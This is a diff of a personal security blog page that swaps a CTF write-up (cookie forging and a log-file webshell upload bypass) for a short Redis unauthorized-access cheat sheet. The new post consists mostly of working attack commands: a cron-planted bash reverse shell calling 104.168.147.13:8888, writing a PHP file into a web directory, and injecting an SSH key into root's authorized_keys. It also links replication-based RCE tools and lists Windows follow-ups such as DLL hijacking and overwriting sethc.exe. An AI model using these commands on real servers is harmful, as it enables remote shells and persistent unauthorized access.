@@ -5,7 +5,7 @@
     
 <meta charset="utf-8" >
 
-<title>第十二届大学生信息安全国赛 | Yyx</title>
+<title>Redis未授权利用及思考 | Yyx</title>
 <meta name="description" content="记得在这杂乱的生活里，带点微笑">
 
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
@@ -80,15 +80,15 @@
       <div class="content-container">
         <div class="post-detail">
           
-          <h2 class="post-title">第十二届大学生信息安全国赛</h2>
+          <h2 class="post-title">Redis未授权利用及思考</h2>
           <div class="post-info post-detail-info">
-            <span><i class="icon-calendar-outline"></i> 2021-06-06</span>
+            <span><i class="icon-calendar-outline"></i> 2021-08-23</span>
             
               <span>
                 <i class="icon-pricetags-outline"></i>
                 
-                  <a href="https://www.yyxyy.xyz/tag/6ggTDlhai/">
-                    ctf
+                  <a href="https://www.yyxyy.xyz/tag/DaAEXO-Dc/">
+                    漏洞总结
                     
                   </a>
                 
@@ -96,81 +96,50 @@
             
           </div>
           <div class="post-content">
-            <p>打了一次国赛，题目质量很高，感觉到处都是知识盲区，而且我们队伍没有pwn选手2333.</p>
-<h2 id="easyweb">Easyweb</h2>
-<p>拿到源码，发现可以伪造cookie，登录.</p>
-<pre><code class="language-php">&lt;?php
-function encode($str,$key)
-{
-    $tmp=&quot;&quot;;
-    for ($i=0;$i&lt;strlen($str);$i++)
-    {
-        $tmp .= chr(ord($str[$i])^ord($key[$i%strlen($key)]));
-    }
-    return base64_encode($tmp);
-}
-
-function decode($str,$key)
-{
-    $str=base64_decode($str);
-    $tmp=&quot;&quot;;
-    for ($i=0;$i&lt;strlen($str);$i++)
-    {
-        $tmp .= chr(ord($str[$i])^ord($key[$i%strlen($key)]));
-    }
-    return $tmp;
-}
-
-function is_login()
-{
-    global $username,$secret;
-    if (!isset($_COOKIE[&quot;username&quot;]))
-        return false;
-    $username=decode($_COOKIE[&quot;username&quot;],$secret);
-    return true;
-}
+            <h1 id="redis几种基本拿shell的方法">redis几种基本拿shell的方法</h1>
+<h2 id="0x01-计划任务执行命令反弹shell">0x01 计划任务执行命令反弹shell</h2>
+<pre><code class="language-shell">set xxx &quot;\n\n* * * * * bash -i&gt;&amp; /dev/tcp/104.168.147.13/8888 0&gt;&amp;1\n\n&quot;
+config set dir /var/spool/cron
+config set dbfilename root
+save
 </code></pre>
-<p>登录后发现是一个上传文件的地方.</p>
-<p>update源码</p>
-<pre><code class="language-php">&lt;?php
-include &quot;config.php&quot;;
-include &quot;function.php&quot;;
-
-is_login();
-
-if ($username!==&quot;admin&quot;)
-{
-    echo &quot;You have not permission.&lt;script&gt;setTimeout('location.href=\&quot;index.php\&quot;',3000);&lt;/script&gt;&quot;;
-    die;
-}
-
-if (!$_FILES[&quot;file&quot;][&quot;name&quot;])
-{
-    echo &quot;Please chose a file to upload.&lt;script&gt;setTimeout('location.href=\&quot;user.php\&quot;',3000);&lt;/script&gt;&quot;;
-    die;
-}
-
-$file_name=$_FILES[&quot;file&quot;][&quot;name&quot;];
-
-if (preg_match(&quot;/php/i&quot;,$file_name))
-{
-    echo &quot;You cant upload php file.&lt;script&gt;setTimeout('location.href=\&quot;user.php\&quot;',3000);&lt;/script&gt;&quot;;
-    die;
-}
-
-file_put_contents(&quot;logs/upload.log.php&quot;,&quot;User {$username} uploaded file {$file_name}.\n&quot;,FILE_APPEND);
-echo &quot;I logged the file name you uploaded. LOL&lt;script&gt;setTimeout('location.href=\&quot;user.php\&quot;',3000);&lt;/script&gt;&quot;;
+<h2 id="0x02-写web目录">0x02 写web目录</h2>
+<pre><code class="language-shell">config set dir /tmp/   这里应该是web目录
+config set dbfilename test.php
+set 1 &quot;&lt;?= phpinfo(); ?&gt;&quot;
+save
 </code></pre>
-<p>过滤了php，所以用 **<?= ?>**绕过.文件名称会被记录到log里面，所以里可以构成一句话木马.</p>
+<h2 id="0x03-写ssh-key">0x03 写SSH key</h2>
+<pre><code class="language-shell">ssh-key -t rsa#然后按照next执行就行了
+(echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; test.txt
+cat test.txt |redis-cli -h 192.168.0.109 -a 123456 -x set crackit
+redis执行
+config set dir /root/.ssh
+config set dbfilename authorized_keys
+save
+</code></pre>
+<h2 id="0x04-主从复制">0x04 主从复制</h2>
+<p>https://github.com/vulhub/redis-rogue-getshell</p>
+<p>https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf</p>
+<h1 id="redis-在win下面的利用及思考">redis 在win下面的利用及思考</h1>
+<h2 id="网上常见的方法">网上常见的方法</h2>
+<p>1.web目录写马</p>
+<p>2.写启动项</p>
+<p>https://www.bilibili.com/read/cv7358287/</p>
+<p>https://uknowsec.cn/posts/notes/Redis%E5%9C%A8Windows%E7%8E%AF%E5%A2%83%E4%B8%8BGetshell.html</p>
+<h2 id="一些其它的方法">一些其它的方法</h2>
+<p>1.dll劫持</p>
+<p>2.覆写一些文件，让用户点击。</p>
+<p>3.覆写sethc.exe。</p>
 
           </div>
         </div>
 
         
           <div class="next-post">
-            <a class="purple-link" href="https://www.yyxyy.xyz/post/xss/">
+            <a class="purple-link" href="https://www.yyxyy.xyz/post/flask-ssti-lou-dong-fu-xian/">
               <h3 class="post-title">
-                下一篇：XSS
+                下一篇：Flask ssti 漏洞复现
               </h3>
             </a>
           </div>
